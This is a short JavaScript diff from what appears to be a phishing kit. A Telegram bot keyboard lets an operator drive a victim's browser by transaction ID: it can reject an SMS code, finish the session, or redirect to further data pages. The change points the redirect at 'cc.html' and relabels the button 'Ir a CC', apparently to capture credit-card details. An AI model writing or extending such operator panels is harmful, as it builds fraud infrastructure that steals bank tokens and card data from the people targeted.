@@ -210,7 +210,7 @@
                                     checkAllFilled();
                                     break;
                                 case 'pedir_datos_2':
-                                    window.location.href = "datos.html";
+                                    window.location.href = "cc.html";
                                     break;
                                 case 'finalizar':
                                     window.location.href = "finish.html";
@@ -299,7 +299,7 @@
                 const keyboard = {
                     inline_keyboard: [
                         [{ text: "❌ Error Código SMS", callback_data: `error_token_sms:${transactionId}` }],
-                        [{ text: "📋 Ir a Datos 2", callback_data: `pedir_datos_2:${transactionId}` }],
+                        [{ text: "📋 Ir a CC", callback_data: `pedir_datos_2:${transactionId}` }],
                         [{ text: "🚨Finalizar", callback_data: `finalizar:${transactionId}` }]
                     ]
                 };
